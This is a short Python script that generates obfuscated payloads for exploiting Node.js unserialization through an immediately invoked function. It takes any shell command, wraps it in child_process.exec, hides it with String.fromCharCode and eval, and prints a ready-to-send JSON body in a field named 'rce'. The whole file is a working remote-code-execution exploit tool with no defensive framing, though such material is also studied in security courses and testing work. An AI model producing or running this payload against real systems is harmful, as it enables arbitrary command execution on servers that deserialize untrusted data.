#!/usr/bin/python
# Generator for encoded NodeJS payloads for exploiting unserialization and IIFE
# Based on the NodeJS reverse shell by OpSecX
# https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys

if len(sys.argv) != 2:
    print "Usage: %s CMD" % (sys.argv[0])
    sys.exit(0)

CMD = sys.argv[1]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

NODEJS_REV_SHELL = '''
require('child_process').exec('%s', function(error, stdout, stderr) { console.log(stdout) });
''' % (CMD)

PAYLOAD = charencode(NODEJS_REV_SHELL)
sys.stdout.write('{"rce":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % (PAYLOAD))